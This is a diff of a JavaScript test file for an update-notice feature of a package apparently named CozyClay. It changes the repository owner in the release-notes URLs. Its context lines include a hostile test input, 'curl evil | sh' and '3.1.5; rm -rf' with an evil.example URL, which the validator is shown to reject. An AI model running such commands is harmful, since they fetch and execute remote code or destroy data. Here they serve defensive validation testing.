@@ -20,7 +20,7 @@ import { readFileSync } from "node:fs";
 
 const body = (over = {}) => ({
 	enabled: true, current: "3.1.4", latest: "3.1.5", status: "outdated", kind: "global", canSelfUpdate: true, phase: "idle",
-	errorClass: null, durationMs: null, notesUrl: "https://github.com/NomaDamas/CozyClay/releases/tag/v3.1.5", command: "npm install -g cozyclay@latest", ...over,
+	errorClass: null, durationMs: null, notesUrl: "https://github.com/HaD0Yun/CozyClay/releases/tag/v3.1.5", command: "npm install -g cozyclay@latest", ...over,
 });
 const info = (over) => normalizeUpdateInfo(body(over));
 const memoryStorage = (initial = {}) => {
@@ -69,7 +69,7 @@ const settle = async () => { for (let i = 0; i < 5; i += 1) await Promise.resolv
 	assert.deepEqual([behindOf("3.1.4", "3.2.0"), behindOf("2.0.2", "3.1.4"), behindOf("3.1.4", "3.1.9")], ["minor", "major", "patch"]);
 	const hostile = normalizeUpdateInfo(body({ latest: "3.1.5; rm -rf", notesUrl: "https://evil.example/v3.1.5", command: "curl evil | sh", kind: "weird", phase: "boom" }));
 	assert.deepEqual([hostile.latest, hostile.notesUrl, hostile.kind, hostile.phase, hostile.command], [null, null, "clone", "idle", "npm install -g cozyclay@latest"], "only closed values survive");
-	assert.equal(normalizeUpdateInfo(body({ notesUrl: "https://github.com/NomaDamas/CozyClay/releases/tag/v9.9.9" })).notesUrl, null, "notes must name latest");
+	assert.equal(normalizeUpdateInfo(body({ notesUrl: "https://github.com/HaD0Yun/CozyClay/releases/tag/v9.9.9" })).notesUrl, null, "notes must name latest");
 	assert.equal(normalizeUpdateInfo("nope"), null);
 }
 console.log("PASS reducer: visible for outdated global/npx not dismissed; updating/restart/failed always; actions by kind and canSelfUpdate");
@@ -557,7 +557,7 @@ console.log("PASS restart: one POST, every tab waits through failed fetches for 
 		for (const [id, timer] of [...pending]) if (timer.at <= clock) { pending.delete(id); timer.fn(); }
 		for (let i = 0; i < 4; i += 1) await new Promise((resolve) => setImmediate(resolve));
 	};
-	const waiting = { phase: "restart_needed", installed: "3.1.5", latest: "3.2.0", notesUrl: "https://github.com/NomaDamas/CozyClay/releases/tag/v3.2.0", durationMs: 4000 };
+	const waiting = { phase: "restart_needed", installed: "3.1.5", latest: "3.2.0", notesUrl: "https://github.com/HaD0Yun/CozyClay/releases/tag/v3.2.0", durationMs: 4000 };
 	const launcher = { mode: "old" };
 	const fetchImpl = async (url) => {
 		if (url === RESTART_URL) { launcher.mode = "down"; return { ok: true, status: 202, json: async () => body(waiting) }; }
